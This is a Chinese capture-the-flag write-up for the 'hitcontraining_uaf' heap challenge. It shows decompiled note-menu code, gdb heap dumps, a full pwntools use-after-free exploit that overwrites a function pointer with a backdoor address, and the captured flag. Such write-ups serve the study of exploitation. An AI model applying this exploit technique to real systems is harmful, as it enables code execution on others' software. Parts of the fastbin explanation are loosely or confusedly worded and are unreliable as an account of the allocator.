# hitcontraining_uaf

[题目地址](https://buuoj.cn/challenges#hitcontraining_uaf)

我是sb。

这题真的超级简单，超级超级简单那种，也是我遇见第一道有点眉目的题，但是还是没出来。我是超级超级的sb。(⌒-⌒; )

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

防护也没开多少。唉我怎么就没做出来呢，还是对堆知识不熟啊。main函数就不放了，我描述一下，一个正常菜单类堆题，有添加，删除和打印操作，注意没有4件套中的编辑功能。添加函数的实现非常有个性。

```c
void add_note(void)

{
  int iVar1;
  void *pvVar2;
  char size [8];
  size_t _size;
  int i;
  
  if (count < 6) {
    for (i = 0; i < 5; i = i + 1) {
      if (*(int *)(notelist + i * 4) == 0) {
        pvVar2 = malloc(8);
        *(void **)(notelist + i * 4) = pvVar2;
        if (*(int *)(notelist + i * 4) == 0) {
          puts("Alloca Error");
                    /* WARNING: Subroutine does not return */
          exit(-1);
        }
        **(code ***)(notelist + i * 4) = print_note_content;
        printf("Note size :");
        read(0,size,8);
        _size = atoi(size);
        iVar1 = *(int *)(notelist + i * 4);
        pvVar2 = malloc(_size);
        *(void **)(iVar1 + 4) = pvVar2;
        if (*(int *)(*(int *)(notelist + i * 4) + 4) != 0) {
          printf("Content :");
          read(0,*(void **)(*(int *)(notelist + i * 4) + 4),_size);
          puts("Success !");
          count = count + 1;
          return;
        }
        puts("Alloca Error");
                    /* WARNING: Subroutine does not return */
        exit(-1);
      }
    }
  }
  else {
    puts("Full");
  }
  return;
}
```

联系打印操作。

```c
void print_note(void)

{
  char local_14 [4];
  int index;
  
  printf("Index :");
  read(0,local_14,4);
  index = atoi(local_14);
  if ((-1 < index) && (index < count)) {
    if (*(int *)(notelist + index * 4) != 0) {
      (***(code ***)(notelist + index * 4))(*(undefined4 *)(notelist + index * 4));
    }
    return;
  }
  puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```

跟其他实现方法天差地别，这里是调用add时添加的代码来打印内容。删除操作有很明显的uaf。

```c
void del_note(void)

{
  char local_14 [4];
  int index;
  
  printf("Index :");
  read(0,local_14,4);
  index = atoi(local_14);
  if ((-1 < index) && (index < count)) {
    if (*(int *)(notelist + index * 4) != 0) {
      free(*(void **)(*(int *)(notelist + index * 4) + 4));
      free(*(void **)(notelist + index * 4));
      puts("Success");
    }
    return;
  }
  puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```

这题真的非常简单，包括代码的实现都很新手友好。关键在于fastbin的管理机制。直接放exp，过于简单导致我不知道怎么分析。

```python
from pwn import *
context.log_level = 'debug'
sh = remote("node4.buuoj.cn",25271)

def add(size,content):
	sh.sendlineafter('choice :','1')
	sh.sendlineafter('size :',str(size))
	sh.sendlineafter('Content :',content)
def free(idx):
	sh.sendlineafter('choice :','2')
	sh.sendlineafter('Index :',str(idx))
def show(idx):
	sh.sendlineafter('choice :','3')
	sh.sendlineafter('Index :',str(idx))

magic_addr = 0x08048945
add(16,'aaaa')
add(16,'bbbb')
free(0)
free(1)
add(8,p32(magic_addr))#申请8字节才能将chunk2的content指针指向chunk0的前8个字节
show(0)
sh.interactive()
```

先申请两个笔记，实际上我们malloc了4个块，因为每个笔记都要单独malloc 2个堆块，一个给print_note_content指针，一个给用户输入内容。add一个笔记后notelist长这样。

```
(gdb) x/16x 0x0804a048
0x804a048 <notelist>:   0x08b051a0      0x00000000      0x00000000      0x00000000
0x804a058 <notelist+16>:        0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a078:      0x00000000      0x00000000      0x00000000      0x00000000
```

看看0x08b051a0里面是啥。

```
(gdb) x/16x 0x08b051a0 
0x8b051a0:      0x080485fb      0x08b051b0      0x00000000      0x00000011
0x8b051b0:      0x00000061      0x00000000      0x00000000      0x00021e49
0x8b051c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8b051d0:      0x00000000      0x00000000      0x00000000      0x00000000
```

0x080485fb是print_note_content函数指针，0x08b051b0是输入的内容，这里就一个a。0x08b051b0和0x00000011中间的空内容是因为程序malloc了8个字节，但是指针只有4个字节长。接着exp，free 0号笔记和1号笔记，由于删除笔记选项中先free内容指针，再free函数指针，fastbin就有着这样的结构，括号内是它的大小：

笔记0内容指针堆块（16）->笔记0函数指针堆块（8）->笔记1内容指针堆块（16）->笔记1函数指针堆块（8）

现在我们add一个内容大小为8的新笔记。首先从链表中拿出一个长度为8的堆块给函数指针，然后再拿一个长度为8的堆块给内容指针。所以新的笔记的内容指针堆块等同于笔记1函数指针堆块（8），函数指针堆块等同于笔记0函数指针堆块（8）。我们将内容设置为magic_addr等同于将笔记0函数指针堆块（8）更改为笔记0函数指针堆块（8）。此时print堆块就是执行后门了。就这么简单，这还没有rop复杂呢。

## Flag
> flag{69f11a87-58fb-4a8f-930f-acdb13800cba}